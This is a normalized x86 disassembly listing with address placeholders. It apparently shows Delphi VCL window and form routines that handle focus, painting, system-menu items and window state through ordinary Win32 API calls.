test eax eax
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi ebx
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax esi
call sub_451b4c
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_458a28
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_4585f8
push eax
call SetFocus
mov eax esi
call sub_4585f8
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
mov esi ebx
jmp r-xdata
sub_440f1c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x276 ] bl
mov eax [ esi + 0x2c4 ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
movzx ecx bl
mov edx 0xb02b
call sub_451b4c
pop esi
pop ebx
retn
cmp [ esi + 0x268 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_440fd0
mov eax esi
call sub_440ea4
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_458a28
mov edx eax
mov eax esi
call sub_440ad0
sub_440f80
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp [ ebx + 0x268 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43f4f4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x268 ]
call sub_451b4c
mov eax ebx
call sub_43f4f4
mov edx esi
call sub_440f80
sub_440fd0
push esi
test [ eax + 0x358 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x290 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x277 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x290 ]
test dl dl
je r-xdata
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx esi
call sub_438910
mov edx esi
call sub_4388f4
jmp r-xdata
mov ecx [ eax + 0x290 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x290 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_441078
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4585f8
push eax
call SendMessageA
sub_4410c4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb000
call sub_441078
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4410f4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb001
call sub_441078
cmp [ ebx + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_441160
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_4253d0
xor edx edx
push ebp
push sub_44135b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov edx [ ebp - 0x8 ]
call sub_42579c
xor edx edx
push ebp
push sub_441338
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4412eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_447e3c
mov ebx eax
mov eax ebx
call sub_448128
test al al
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
movzx eax [ eax + 0x8 ]
xor al 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412f2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
jmp r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000002
call sub_424fb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov eax [ eax + 0x14 ]
mov dl 0x5
call sub_4250d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_424230
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_425714
push eax
call SetBkColor
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_42535c
push 0x4
call GetStockObject
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_425714
push eax
call FillRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
jne r-xdata
sub_4412f2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa6
call sub_40484c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44133f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
xor edx edx
call sub_42579c
retn
sub_441368
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_43f4f4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_43f528
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd0
call sub_40484c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_457890
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_43f574
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx edx [ esp + 0x4 ]
mov eax edi
mov si 0xffd0
call sub_40484c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_44140c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4585f8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_441144
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4585f8
push eax
call EndPaint
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_4564d0
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_44148a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_45944c
cmp [ ebx + 0x298 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x298 ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_4414b4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x1a4 ]
call sub_424fec
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_441514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
mov [ esi ] 0x27
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_456894
pop esi
pop ebx
retn
sub_44155c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x277 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4585f8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_441658
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x290 ]
mov eax [ ebp - 0x4 ]
call sub_43f914
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_44155c
pop ecx
sub_4416a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_452518
cmp [ ebx + 0x8f ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4585f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4585f8
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_450fd0
pop esi
pop ebx
retn
sub_441730
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebp edx
mov edi eax
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
cmp [ edi + 0x340 ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax edi
mov si 0xffa8
call sub_40484c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ edi + 0x340 ]
call sub_43fb78
mov edx edi
call sub_4198f4
test eax eax
jge r-xdata
inc esi
xor ebx ebx
xor eax eax
mov [ edi + 0x344 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x340 ]
call sub_43fb50
mov edx edi
call sub_4198f4
inc eax
jle r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_419898
push eax
mov eax edi
call sub_43fb78
pop edx
call sub_419740
cmp [ edi + 0x290 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_4585f8
push eax
call SendMessageA
mov edx edi
mov eax [ rw-data ]
call sub_447ae0
mov [ esp ] eax
mov eax [ edi + 0x1b4 ]
mov [ esp + 0x4 ] eax
cmp [ edi + 0x344 ] 0x0
setne al
mov [ esp + 0x8 ] al
mov eax [ rw-data ]
mov eax [ eax + 0xc8 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb048
push ebx
call SendMessageA
mov eax [ edi + 0x340 ]
call sub_43fb78
mov edx edi
call sub_419740
jmp r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_419898
call sub_458904
test al al
je r-xdata
mov edx ebp
mov eax edi
call sub_4577ec
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x277 ] 0x1
je r-xdata
push 0x0
mov eax edi
call sub_4585f8
push eax
call SetMenu
xor edx edx
mov eax [ edi + 0x290 ]
call sub_4382c8
sub_441898
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_456700
cmp [ ebx + 0x290 ] 0x0
je r-xdata
movzx edx [ esi + 0x4 ]
mov eax [ ebx + 0x290 ]
call sub_437ac4
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_4418e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_438594
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44191c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4419b7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x290 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419be
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x290 ]
call sub_437a24
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4470d4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_44d5a8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4470d4
jmp r-xdata
sub_4419c4
push ebx
push esi
mov esi edx
mov ebx eax
push 0xfffffff0
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
and eax 0x40000000
cmp eax 0x40000000
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
setne dl
mov eax ebx
call sub_440f1c
sub_441a08
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
jne r-xdata
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebx + 0x273 ] dl
pop ebx
retn
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_441a64
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_440f80
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_44d380
test eax eax
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx [ eax + 0x290 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_441abc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4576cc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4458cc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x273 ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_441b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x274 ] 0x2
jmp r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x274 ] 0x1
mov [ ebx + 0x274 ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
movzx eax [ ebx + 0x274 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4585f8
push eax
call ShowWindow
mov [ ebx + 0x274 ] 0x0
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ rw-data ] 0x0
pop esi
pop ebx
retn
sub_441bec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4585f8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_440f1c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd0
call sub_40484c
sub_441c44
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x268 ]
call sub_458b34
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_441c70
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_440f80
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_441c8c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_437a54
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_437a54
sub_441ccc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x158 ] 0x1
jne r-xdata
cmp [ esi + 0x158 ] 0x0
jne r-xdata
cmp [ esi + 0x160 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x15c ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_441d04
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x158 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x15c ]
call sub_405584
mov [ edx ] 0x1
mov eax [ ebx + 0x160 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_441d38
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_441ea2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441ea9
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0xd ] 0x1
push ebp
mov eax [ esi + 0x290 ]
call sub_441c8c
pop ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_44d2f4
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_418420
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x25 ]
mov eax esi
call sub_450324
movzx eax [ ebp - 0x25 ]
mov [ ebp - 0x29 ] ax
movzx eax [ ebp - 0x21 ]
mov [ ebp - 0x27 ] ax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x11 ] eax
push ebp
mov eax [ esi + 0x80 ]
call sub_441c8c
pop ecx
mov [ ebp - 0xc ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_441ccc
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_446d0c
jmp r-xdata
mov ecx [ ebp - 0x11 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_446d94
mov ecx [ ebp - 0xc ]
mov edx 0x8
mov eax [ rw-data ]
call sub_446d94
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0xd ]
mov eax ebx
call sub_441d04
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_418420
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x19 ]
mov eax ebx
call sub_450324
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1d ] ax
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1b ] ax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x11 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_446c7c
test [ esi + 0x270 ] 0x8
je r-xdata
sub_441eb0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x272 ] 0x0
je r-xdata
mov edi [ esp ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0x74 ]
lea edx [ edi + 0x18 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jbe r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea edx [ edi + 0x20 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jbe r-xdata
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea eax [ edi + 0x20 ]
push eax
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x1c ]
lea edx [ edi + 0x18 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ edx + 0x4 ] ecx
sub_441f24
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x34c ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_441f50
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x348 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569f4
mov eax [ ebp - 0x4 ]
call sub_447e3c
mov esi eax
mov eax esi
call sub_448128
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov edi edx
mov edx [ ebp - 0x4 ]
sub edi [ edx + 0x48 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov ebx eax
test edi edi
jne r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f5f4
lea edx [ ebp - 0x34 ]
call sub_443b04
push ebp
mov eax [ ebp - 0x4 ]
call sub_43f5f4
lea edx [ ebp - 0x44 ]
call sub_443b04
mov ecx [ ebp - 0x44 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x34 ]
call sub_441f24
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_43f5f4
lea edx [ ebp - 0x44 ]
call sub_443b04
mov ecx [ ebp - 0x40 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x30 ]
call sub_441f24
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
call sub_441f24
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
